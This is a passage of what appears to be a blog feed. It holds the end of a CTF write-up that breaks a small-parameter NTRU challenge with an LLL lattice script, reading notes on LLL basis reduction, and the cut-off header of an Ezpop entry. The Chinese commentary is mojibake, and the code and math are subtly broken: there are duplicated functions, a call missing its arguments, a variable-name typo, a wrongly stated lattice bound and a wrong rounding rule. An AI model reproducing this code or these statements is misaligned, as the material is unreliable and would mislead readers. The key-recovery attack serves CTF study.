6022</span></span><br></pre></td></tr></table></figure><h2 id="analyses-3"><a href="#analyses-3" class="headerlink" title="analyses"></a>analyses</h2><p>NTRU, å‚æ•°å¤Ÿå°å°±èƒ½é€šè¿‡æ ¼åŸºè§„çº¦æ±‚å‡ºç§é’¥$f$, ç„¶åé€šè¿‡æ­£å¸¸çš„è§£å¯†æµç¨‹è¿›è¡Œè§£å¯†äº†</p><blockquote><p>è¿™é‡Œæœ‰å‡ ä¸ªç‚¹éœ€è¦æ³¨æ„ä¸€ä¸‹:</p><ol><li><p>NTRUèƒ½å¤Ÿç”¨æ¥è§£å¯†çš„ç§é’¥$f$ä¸æ­¢ä¸€ä¸ª, æ‰€ä»¥å¯èƒ½æœ‰å¤šä¸ªç§é’¥èƒ½å¤Ÿè§£å¯†å¯†æ–‡. ç‰¹åˆ«æ˜¯è§„çº¦ä¹‹åçš„çŸ©é˜µ, å¸¸å¸¸èƒ½è§„çº¦å‡ºä¸€å¤§å †ç§é’¥$f$æ¥.</p></li><li><p>åœ¨æ„é€ æ ¼å­çš„æ—¶å€™, ç³»æ•°æ—‹è½¬çš„æ–¹å‘ä¸€å®šè¦æ­£ç¡®, åœ¨åšè¿™é“é¢˜çš„æ—¶å€™æˆ‘å°±å› ä¸ºæ—‹è½¬çš„æ–¹å‘åäº†åšäº†ä¸€æ•´å¤©(æˆ‘è¿˜ä¸€ç›´ä»¥ä¸ºè‡ªå·±è§£å¯†å†™é”™äº†</p></li><li><p>é€ æ ¼å­æœ‰å¾ˆå¤šæ–¹æ³•, è¿™è¾¹è®°å½•ä¸€ä¸‹ä¸¤ä¸ª</p><p>ç¬¬ä¸€ä¸ªæ ¼å­è§„çº¦å‡ºæ¥çš„ä¸Šé¢$n$è¡Œ, æ¯è¡Œçš„å‰ä¸€åŠæ˜¯ç§é’¥$f$, åä¸€åŠæ˜¯éšæœºå‘é‡$g$<br>$$<br>\begin{pmatrix}<br>1&amp;0&amp;\cdots&amp;0&amp;h_0&amp;h_1&amp;\cdots &amp;h_{n-1} \\<br>0&amp;1&amp;\cdots&amp;0&amp;h_{n-1}&amp;h_0&amp;\cdots&amp;h_{n-2} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;\cdots&amp;1&amp;h_{1}&amp;h_2&amp;\cdots&amp;h_{0} \\<br>0&amp;0&amp;\cdots&amp;0&amp;p&amp;0&amp;\cdots&amp;0 \\<br>0&amp;0&amp;\cdots&amp;0&amp;0&amp;p&amp;\cdots&amp;0 \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;\cdots&amp;p<br>\end{pmatrix}<br>$$<br>ç¬¬äºŒä¸ªæ ¼å­è§„çº¦å‡ºæ¥çš„ä¸Šé¢$n$è¡Œ, æ¯è¡Œçš„åä¸€åŠæ˜¯ç§é’¥$f$, å‰ä¸€åŠæ˜¯éšæœºå‘é‡$g$<br>$$<br>\begin{pmatrix}<br>p&amp;0&amp;\cdots&amp;0&amp;0&amp;0&amp;\cdots&amp;0\\<br>0&amp;p&amp;\cdots&amp;0&amp;0&amp;0&amp;\cdots&amp;0 \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;\cdots&amp;p&amp;0&amp;0&amp;\cdots&amp;0 \\<br>h_0&amp;h_1&amp;\cdots &amp;h_{n-1}&amp;1&amp;0&amp;\cdots&amp;0 \\<br>h_{n-1}&amp;h_0&amp;\cdots&amp;h_{n-2}&amp;0&amp;1&amp;\cdots&amp;0 \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots&amp;\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>h_{1}&amp;h_2&amp;\cdots&amp;h_{0}&amp;0&amp;0&amp;\cdots&amp;1<br>\end{pmatrix}<br>$$</p></li></ol></blockquote><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line">Zx.&lt;x&gt; = ZZ[]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balancedmod</span>(<span class="params">f,N,q</span>):</span></span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) %q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> Zx(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convolution</span>(<span class="params">f,g,N</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^N-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randomdpoly</span>(<span class="params">d,N</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> d &lt;= N</span><br><span class="line">    result = N*[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(d):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            r = randrange(N)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> result[r]: <span class="keyword">break</span></span><br><span class="line">        result[r] = <span class="number">1</span> - <span class="number">2</span>*randrange(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodprime</span>(<span class="params">f,N,p</span>):</span></span><br><span class="line">    T = Zx.change_ring(Integers(p)).quotient(x^N-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodpowerof2</span>(<span class="params">f,N,q</span>):</span></span><br><span class="line">    <span class="keyword">assert</span> q.is_power_of(<span class="number">2</span>)</span><br><span class="line">    g = invertmodprime(f,<span class="number">2</span>,N)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r = balancedmod(convolution(g,f),q)</span><br><span class="line">        <span class="keyword">if</span> r == <span class="number">1</span>: </span><br><span class="line">            <span class="keyword">return</span> g</span><br><span class="line">        g = balancedmod(convolution(g,<span class="number">2</span> - r),q)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">randommessage</span>(<span class="params">N,p</span>):</span></span><br><span class="line">    result = <span class="built_in">list</span>(randrange(p) - <span class="number">1</span> <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> Zx(result)</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keypair</span>(<span class="params">d,N,q,p</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = randomdpoly(d,N)</span><br><span class="line">            fp = invertmodprime(f,N,p)</span><br><span class="line">            fq = invertmodpowerof2(f,N,q)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    g = randomdpoly()</span><br><span class="line">    publickey = balancedmod(p * convolution(fq,g,N),N,q)</span><br><span class="line">    secretkey = f,fp</span><br><span class="line">    <span class="keyword">return</span> publickey,secretkey</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">message,publickey,N,q</span>):</span></span><br><span class="line">    r = randomdpoly(randint(N))</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(publickey,r) + message,N,q)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span>(<span class="params">ciphertext,secretkey,N,q,p</span>):</span></span><br><span class="line">    f,fp = secretkey</span><br><span class="line">    a = balancedmod(convolution(ciphertext,f,N),N,q)</span><br><span class="line">    <span class="keyword">return</span> balancedmod(convolution(a,fp,N),N,p)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">balancedmod</span>(<span class="params">f,N,q</span>):</span></span><br><span class="line">    g = <span class="built_in">list</span>(((f[i] + q//<span class="number">2</span>) %q) - q//<span class="number">2</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N))</span><br><span class="line">    <span class="keyword">return</span> Zx(g)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">invertmodprime</span>(<span class="params">f,N,p</span>):</span></span><br><span class="line">    T = Zx.change_ring(Integers(p)).quotient(x^N-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> Zx(lift(<span class="number">1</span> / T(f)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convolution</span>(<span class="params">f,g,N</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (f*g) % (x^N-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">N = <span class="number">53</span></span><br><span class="line">q = <span class="number">28019</span></span><br><span class="line">p = <span class="number">257</span></span><br><span class="line">B = Matrix([[<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*N)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>*N)])</span><br><span class="line">ex = ...</span><br><span class="line">hx = ...</span><br><span class="line">H = hx.<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">sigma = <span class="number">1</span></span><br><span class="line">_lambda = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">        B[i+N,j] = <span class="built_in">int</span>(H[j-i])</span><br><span class="line">        <span class="keyword">if</span> i == j:</span><br><span class="line">            B[i,j] = sigma * q</span><br><span class="line">            B[N+i,N+j] = _lambda * <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">L = B.LLL()[<span class="number">1</span>]</span><br><span class="line">fx = Zx(<span class="built_in">list</span>(L[N:]))</span><br><span class="line">fp = invertmodprime(fx,N,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> decrypt(ex,(fx,fp),N,q,p).<span class="built_in">list</span>():</span><br><span class="line">    print(<span class="built_in">chr</span>(<span class="built_in">abs</span>(i)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªexpé¡ºä¾¿æŠŠä¸€äº›è¦ç”¨åˆ°çš„è¿ç®—ä¹Ÿæ”¾è¿‡æ¥äº†, ä»¥ååšNTRUå¯ä»¥ç”¨è¿™äº›è¿ç®—æ¥åš</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;orz è¿˜æ˜¯å¤ªèœäº†ï¼Œè¿™ä¸ªæ¯”èµ›å¯†ç éƒ½è¢«Aç©¿äº†ï¼Œæˆ‘è¿˜æ˜¯åšä¸å‡ºNTRUï¼Œå¸ˆå‚…ä»¬éƒ½è¯´ç®€å•ï¼Œå¤šé¡¹å¼æ€æˆ‘&lt;br&gt;è¿˜æ˜¯è¯¦ç»†è®°å½•ä¸€ä¸‹å§ï¼ŒåŠ æ²¹&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;0x00-crypto-threshold&quot;&gt;&lt;a href=&quot;#0x</summary>
      
    
    
    
    <category term="WriteUp" scheme="http://tearsjin.github.io/categories/WriteUp/"/>
    
    
    <category term="Crypto" scheme="http://tearsjin.github.io/tags/Crypto/"/>
    
    <category term="NTRU" scheme="http://tearsjin.github.io/tags/NTRU/"/>
    
    <category term="Stream" scheme="http://tearsjin.github.io/tags/Stream/"/>
    
  </entry>
  
  <entry>
    <title>Reading notes An Introduction to Lenstra-Lenstra-Lovasz Lattice Basis Reduction Algorithm</title>
    <link href="http://tearsjin.github.io/2021/03/25/Reading-notes-An-Introduction-to-Lenstra-Lenstra-Lovasz-Lattice-Basis-Reduction-Algorithm/"/>
    <id>http://tearsjin.github.io/2021/03/25/Reading-notes-An-Introduction-to-Lenstra-Lenstra-Lovasz-Lattice-Basis-Reduction-Algorithm/</id>
    <published>2021-03-25T07:59:45.000Z</published>
    <updated>2021-04-04T07:59:07.297Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p><strong>Definition 1.1</strong>(Lattice). A lattice $\mathcal L$ is a discrete subgroup of $H$ generated by all the integer combinations of the vectors of some basis $B$ :<br>$$<br>\mathcal L = \sum^m_{i=1}\mathbb Zb_i = \lbrace \sum^m_{i=1}z_ib_i, where \ z_i \in \mathbb Z,b_i \in B \rbrace .<br>$$<br><strong>Theorem 1.1</strong> (Minowskiâ€™s Theorem). Any convex, centrally symmetric body $S$ of volume $vol(S) &gt; 2^ndet(\mathcal L)$ contains a non-zero lattice point. $det(\mathcal L)$ is the determinant of a lattice $\mathcal L$ .</p><p><strong>Definition 1.2</strong> (Fundamental Region). A set $\mathcal F \subseteq \mathbb R^n$ of a lattice $\mathcal F$ if its translation $x+\mathcal F = {x+y:y \in \mathcal F}$,taken over all $x \in \mathcal L$, form a partition of $\mathbb R^n$.</p><p><strong>Corollary 1.1.1</strong> For any n-dimensional lattice $\mathcal L$, we have the length of shortest vector $\lambda(\mathcal L) &gt; \sqrt n \cdot det(\mathcal L)^{1 \over n}$</p><h1 id="Basis-Reduction"><a href="#Basis-Reduction" class="headerlink" title="Basis Reduction"></a>Basis Reduction</h1><p>â€‹    Basis reduction is a process of reducing the basis $B$ of a lattice $\mathcal L$ to a shorter basis $Bâ€™$ while keeping $\mathcal L$ the same.</p><p>â€‹    There are some ways to change the basis but keep the same lattice :</p><pre><code>      1. Swap two vectors in the basis.      2. For a vector $b_i \in B $, use $-b_i$ instead.      3. For a vector $b_i \in B$, add a linear combination of other basis vectors to it.</code></pre><p>Basis reduction can help solving SVP, because if we can not reduce a basis anymore, the shortest basis vector should be the shortest vector of the lattice.</p><p>Now we start by solving the SVP in 2-dimensional case.</p><p><strong>Definition 2.1</strong> (Two dimensional reduced basis). A basis $(b_1,b_2)$ is said to be reduced if it satisfies following condition:<br>$$<br>|| b_1 || \leq || b_2 || \\<br>u = {b_1 \cdot b_2 \over ||b_1||^2} \leq {1\over 2}<br>$$<br>with the $u$ is called the orthogonal projection coefficient.</p><p><strong>Theorem 2.1</strong>. Given a two dimensional lattice $\mathcal L$ with basis rank 2, if $\lambda$ is the length of the shortest vector in $\mathcal L$, then<br>$$<br>\lambda \leq \sqrt { {2 \over \sqrt3}det(\mathcal L)}.<br>$$<br><strong>Theorem 2.2</strong> if a basis ${b_1,b_2}$ is reduced, then $b_1$ is the shortest vector. </p><blockquote><p>â€‹    About the Definition 2.1 and Theorem 2.1 , 2.2 , I think when we can say we find the shortest vector $b_1$, the basis $(b_1,b_2)$ is said â€œalready be reducedâ€. And it means that this basis satisfies the condition in the <strong>Definition 2.1</strong>.<br>â€‹    So, if $u &gt; {1\over 2}$, the basis can be reduced continued.</p></blockquote><p>The description of Gaussâ€™s algorithm solved SVP in 2-dimensional.</p><ol><li>Start with basis ${b_1,b_2}$, if $||b_1|| &gt; ||b_2||$. swap  $b_1$ and $b_2$.</li><li>Compute $u = {b_1 \cdot b_2 \over ||b_1||^2}.$If $u&gt;{1\over 2}$. let $m$ be the biggest integer that is smaller than $u$, and let $b_2 = b_2 - mb_1.$</li><li>If $||b_1|| &gt; ||b_2||$, then swap $b_1$ and $b_2$, and repeat step 2. Otherwise, output $b_1$ </li></ol><blockquote><p>According the algorithm above, I write the following script with the Sagemath.</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Gauss_2d_reduce</span>(<span class="params">basis</span>):</span></span><br><span class="line">    (b1,b2) = (basis[<span class="number">0</span>],basis[<span class="number">1</span>]) <span class="keyword">if</span> basis[<span class="number">0</span>].norm() &lt; basis[<span class="number">1</span>].norm() <span class="keyword">else</span> (basis[<span class="number">1</span>],basis[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        u = (b1[<span class="number">0</span>]*b2[<span class="number">0</span>] + b1[<span class="number">1</span>]*b2[<span class="number">1</span>]) / b1.norm()^<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> u &gt; <span class="number">0.5</span>:</span><br><span class="line">            m = <span class="built_in">int</span>(u)</span><br><span class="line">            b2 = b2 - m*b1</span><br><span class="line">        <span class="keyword">if</span> b1.norm() &gt; b2.norm():</span><br><span class="line">            b1,b2 = b2,b1</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span>([b1,b2])</span><br></pre></td></tr></table></figure><p>The basis we found in Gauss algorithm is not exactly orthogonal, but it is the nearest basis we can get.</p><h1 id="Gram-Schmidt-Orthogonalization"><a href="#Gram-Schmidt-Orthogonalization" class="headerlink" title="Gram-Schmidt Orthogonalization"></a>Gram-Schmidt Orthogonalization</h1><p>To generalize the algorithm to n-dimensions, we need to find a way to construct n-dimensional orthogonal basis based on the given basis, which leads us to Gram-Schmidt Orthogonalization.</p><p><strong>Theorem 3.1</strong> (Gram-Schmidt Orthogonalization method). Given a basis $\{b_1,b_2,\cdots,b_m\}$ of a subspace $H_m$ of $\mathbb R^n$, we define<br>$$<br>b_1^* = b_1 \\<br>b_2^*=b_2 - u_{1,2}b_1, \ \ \ \ \ \ u_{1,2} = {b_2 \cdot b_1^* \over b_1^* \cdot b_1^*} \\<br>\vdots \\<br>b_m^* = b_m - \sum_{i&lt;m}u_{i,m}b_i \ \ \ \ \ \ u_{i,m} = {b_m \cdot b_i^* \over b_i^* \cdot b_i^*} \\<br>$$<br>Then, $ \{b_1^*,b_2^*,\cdots,b_m^*\} $ is an orthogonal basis of $H_m$. </p><p>Based on this Theorem, if we set $u_{m,m} = 1$, then we have<br>$$<br>b_m = \sum ^m_{i=1}u_{i,m}b_i<br>$$<br>Therefore, we can write the above formula in matrix form, $ B = B^*U $. </p><p>where basis vectors are columns in $B$ and $B^*$. Thus, we have<br>$$<br>U = \begin{pmatrix}<br>u_{1,1}&amp;u_{1,2}&amp;\cdots&amp;u_{1,n} \\<br>0&amp;u_{2,2}&amp;\cdots&amp;u_{2,n} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;u_{n,n} \\<br>\end{pmatrix}<br>=<br>\begin{pmatrix}<br>1&amp;u_{1,2}&amp;\cdots&amp;u_{1,n} \\<br>0&amp;1&amp;\cdots&amp;u_{2,n} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;1 \\<br>\end{pmatrix}<br>$$<br>Obviously, we can know that $det(U) = 1$</p><blockquote><p>For better understanding the matrix , letâ€™s write the matrix at length.</p><p><del>but before write down the matrix, I want to translate the formula in the Theorem 3.1.</del></p><p>$$<br>(b_1,b_2,\cdots,b_n)<br>\begin{pmatrix}<br>1&amp;u_{1,2}&amp;\cdots&amp;u_{1,n} \\<br>0&amp;1&amp;\cdots&amp;u_{2,n} \\<br>\vdots&amp;\vdots&amp;\ddots&amp;\vdots \\<br>0&amp;0&amp;0&amp;1 \\<br>\end{pmatrix} = (b_1^*,b_2^*,\cdots,b_n^*)<br>$$<br>I canâ€™t understand! why $B = B^*U$ ????? </p></blockquote><h1 id="LLL-Basis-Reduction"><a href="#LLL-Basis-Reduction" class="headerlink" title="LLL Basis Reduction"></a>LLL Basis Reduction</h1><p><strong>Definition 4.1</strong> (LLL reduced basis). Let$\{b_1,b_2,\cdots,b_n\}$ be a basis for a n-dimensional Lattice $\mathcal L$ , and $\{b_1^{âˆ—},b_2^{âˆ—},\cdots,b_n^{âˆ—}\}$ be the orthogonal basis generated in Theorem 3.1, and we have $u_{i,k}={b_k \cdot b_i^{âˆ—} \over b_i^{âˆ—} \cdot b_i^{âˆ—}}$. We say $\{b_1,b_2,\cdots,b_n\}$ is a LLL reduced basis if it satisfies two conditions:</p><p>(1) $\forall i \ne k, u_{i,k} \le {1\over 2},$<br>(2) For each $i, ||b_{i+1}^{âˆ—} + u_{i,i+1}b_i^{âˆ—}||^2 \ge {3\over 4}||b_i^{âˆ—}||^2$</p><p><em>Remark</em>. The constant $3\over 4$ is chosen for the simplicity of the paper. Any constant between $1\over 4$ and 1 can guarantee that the algorithm terminates in polynomial time.</p><p><em>Remark</em>. The condition 2 emphasizes the ordering of the basis, like what we did in two dimensional case.</p><p>Given a basis $\{b_1,b_2,\cdots,b_n\}$ in n-dimension, to get a LLL reduced basis, the LLL algorithm works as below.</p><p><img src="http://47.98.130.190:8090/upload/2021/03/1616724105(1)-e7f3a7c1aa0d4556bc0474fc55d46791.jpg" alt="LLL Algorithm"></p><blockquote><ul><li><p>Step 1: Computed the most orthogonal basis based on Gram-Schmidt orthogonalization.</p></li><li><p>Step 2: Check the second condition.</p><p>Because I donâ€™t know how to choose the constant, I run the LLL Algorithm four times with different constants for one output.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">LLL_Algorithm</span>(<span class="params">Lattice,constant=<span class="number">1</span>/<span class="number">4</span></span>):</span></span><br><span class="line">    n = <span class="built_in">len</span>(Lattice[<span class="number">0</span>])</span><br><span class="line">    quickSort(Lattice,<span class="number">0</span>,n-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        finish = <span class="literal">True</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,n+<span class="number">1</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,i):</span><br><span class="line">                m = <span class="built_in">int</span>((Lattice[i-<span class="number">1</span>]*Lattice[k-<span class="number">1</span>]) / (Lattice[k-<span class="number">1</span>] * Lattice[k-<span class="number">1</span>]))</span><br><span class="line">                Lattice[i-<span class="number">1</span>] = Lattice[i-<span class="number">1</span>] - m * Lattice[k-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">1</span>):</span><br><span class="line">            u = (Lattice[i+<span class="number">1</span>]*Lattice[i]) / (Lattice[i] * Lattice[i])</span><br><span class="line">            <span class="keyword">if</span> ((Lattice[i+<span class="number">1</span>]+u*Lattice[i]).norm())^<span class="number">2</span> &lt; ((constant) * (Lattice[i].norm())^<span class="number">2</span>):</span><br><span class="line">                Lattice[i],Lattice[i+<span class="number">1</span>] = Lattice[i+<span class="number">1</span>],Lattice[i]</span><br><span class="line">                finish = <span class="literal">False</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> finish:</span><br><span class="line">            <span class="keyword">if</span> contant == <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> Lattice</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> LLL_Algorithm(Lattice,constant+(<span class="number">1</span>/<span class="number">4</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">Lattice, low, high</span>):</span></span><br><span class="line">    i = (low - <span class="number">1</span>)</span><br><span class="line">    pivot = Lattice[high].norm()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(low, high):</span><br><span class="line">        <span class="keyword">if</span> Lattice[j].norm() &lt;= pivot:</span><br><span class="line">            i = i + <span class="number">1</span></span><br><span class="line">            Lattice[i], Lattice[j] = Lattice[j], Lattice[i]</span><br><span class="line">    Lattice[i + <span class="number">1</span>], Lattice[high] = Lattice[high], Lattice[i + <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> (i + <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">Lattice, low, high</span>):</span></span><br><span class="line">    <span class="keyword">if</span> low &lt; high:</span><br><span class="line">        pi = partition(Lattice, low, high)</span><br><span class="line">        quickSort(Lattice, low, pi - <span class="number">1</span>)</span><br><span class="line">        quickSort(Lattice, pi + <span class="number">1</span>, high)</span><br></pre></td></tr></table></figure></li></ul></blockquote><p><strong>Claim 4.1</strong>. If $\{b_1,b_2,\cdots,b_n\}$ is a n-dimensional LLL reduced basis of Lattice $\mathcal L$, then $||b_1|| \le 2^{n-1 \over 2 }\lambda(\mathcal L)$ is the length of the shortest  vector of $\mathcal L$.</p><blockquote><p>In this paper, the author proof the LLL algorithm terminates in polynomial time of $n$ in the next part. If you want to know how to proof that, you can read the original paper. </p></blockquote><h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><blockquote><p>I think this paper make me understand the LLL Algorithm easily, but I want to know more detail about the LLL Algorithm.  If I have time, I would like to see the original paper about LLL!  -&gt; <a href="https://link.springer.com/content/pdf/10.1007/BF01457454.pdf">https://link.springer.com/content/pdf/10.1007/BF01457454.pdf</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Introduction&quot;&gt;&lt;a href=&quot;#Introduction&quot; class=&quot;headerlink&quot; title=&quot;Introduction&quot;&gt;&lt;/a&gt;Introduction&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Definition 1.1&lt;/strong</summary>
      
    
    
    
    
    <category term="Reading" scheme="http://tearsjin.github.io/tags/Reading/"/>
    
    <category term="LLL" scheme="http://tearsjin.github.io/tags/LLL/"/>
    
  </entry>
  
  <entry>
    <title>Noting of [MRCTF2020]Ezpop</title>
    <link href="http://tearsjin.github.io/2021/03/25/Noting-of-MRCTF2020-Ezpop/"/>
    <id>http://tearsjin.github.io/2021/03/25/Noting-of-MRCTF2020-Ezpop/</id>
